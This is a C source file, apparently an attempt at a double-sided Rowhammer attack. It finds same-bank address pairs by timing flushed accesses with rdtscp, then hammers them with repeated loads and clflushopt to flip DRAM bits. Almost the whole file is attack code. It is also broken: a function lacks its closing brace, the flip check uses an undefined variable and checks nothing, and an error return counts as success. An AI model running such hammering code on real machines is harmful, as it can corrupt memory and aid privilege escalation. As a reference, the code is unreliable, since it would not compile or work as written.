#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <inttypes.h>
#include <x86intrin.h>
#include <stdbool.h>

#define NUM_BLOCKS 10000
#define BLOCK_SIZE 1024
#define N_THRESHOLD 600000
#define N_TIMES 1000

size_t rdtscp(){
    unsigned int aux;
    return __rdtscp(&aux);
}

uint64_t *memory_blocks[NUM_BLOCKS];

void enclave_access_row(uint64_t *p1, uint64_t *p2, uint64_t n_trial) {
    while (n_trial-- > 0) {
        asm volatile("clflushopt (%0)" :: "r"(p1) : "memory");
        asm volatile("clflushopt (%0)" :: "r"(p2) : "memory");
        asm volatile("mfence;");
        asm volatile("mov (%0), %%r10;" :: "r"(p1) : "memory");
        asm volatile("mov (%0), %%r11;" :: "r"(p2) : "memory");
        asm volatile("lfence;");
    }
}

/*
    STEP 1
*/
bool check_addr_in_the_same_bank(uint64_t *p1, uint64_t *p2) {
    size_t start_time = rdtscp();
    enclave_access_row(p1, p2, N_TIMES);
    size_t end_time = rdtscp();
    return( (end_time - start_time) > N_THRESHOLD );
}

/*
    STEP 2 
*/
int find_interleaved_addresses(uint64_t *p1, uint64_t *p2, uint64_t *memory_blocks[NUM_BLOCKS]) {
    int pos_p1 = -1;
    int pos_p2 = -1;

    for (int i = 0; i < NUM_BLOCKS - 2; i++) {
        if (p1 == memory_blocks[i]) {
            pos_p1 = i;
        } else if ( p2 == memory_blocks[i]) {
            pos_p2 = i;
        }
    }
    if (pos_p1 == -1 || pos_p2 == -1) {
        return -1;
    }
    if ( pos_p2 == pos_p1 + 2) {
        if (check_addr_in_the_same_bank(memory_blocks[pos_p1], memory_blocks[pos_p1 + 1])
        && check_addr_in_the_same_bank(memory_blocks[pos_p1 + 1], memory_blocks[pos_p1 + 2])) {
            return 1;
        }
    }
    return 0;

/*
    STEP 3
*/

void chk_flip() {
    for (uint64_t i=0ul; i<mem_size/sizeof(uint64_t); ++i) {
        memory_blocks[i];
    }
}
void dbl_sided_rowhammer(uint64_t *p1, uint64_t *p2, uint64_t n_reads) {
    while(n_reads-- > 0) {
        asm volatile("mov (%0), %%r10;" :: "r"(p1) : "memory");
        asm volatile("mov (%0), %%r11;" :: "r"(p2) : "memory");
        asm volatile("clflushopt (%0);" :: "r"(p1) : "memory");
        asm volatile("clflushopt (%0);" :: "r"(p2) : "memory");
    }
    chk_flip();
}

int main() {
    int i = 0;
    for (i = 0; i < NUM_BLOCKS; i++) {
        memory_blocks[i] = malloc(BLOCK_SIZE);
        if (memory_blocks[i] == NULL) {
           break;
        }
    }

    for (int k = 0; k < NUM_BLOCKS; k++) {
        for (int l = k+1; l < NUM_BLOCKS; l++) {
            if (find_interleaved_addresses(memory_blocks[k], memory_blocks[l], memory_blocks)) {
                dbl_sided_rowhammer(memory_blocks[k], memory_blocks[l], 1000);
            }
        }          
    }

    for (int j = 0; j < i; j++){
        free(memory_blocks[j]); 
    }
    
    return 0;
}